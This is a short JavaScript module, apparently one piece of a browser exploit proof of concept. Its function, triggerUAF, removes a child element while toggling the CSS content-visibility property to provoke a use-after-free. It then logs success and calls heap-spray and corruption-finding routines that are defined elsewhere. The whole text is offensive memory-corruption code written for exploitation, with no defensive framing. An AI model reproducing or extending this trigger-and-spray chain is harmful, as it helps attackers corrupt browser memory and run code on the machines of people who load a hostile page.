export function triggerUAF() {
  const container = document.createElement("div");
  const child = document.createElement("div");
  container.className = "container";
  child.className = "child";
  container.appendChild(child);
  document.body.appendChild(container);

  container.style.contentVisibility = "hidden";
  child.remove();

  setTimeout(() => {
    container.style.contentVisibility = "auto";
    const log = document.getElementById("log");
    log.textContent += "[+] UAF triggered. Running heap spray...\n";
    window.sprayHeap();
    window.findCorruption();
  }, 100);
}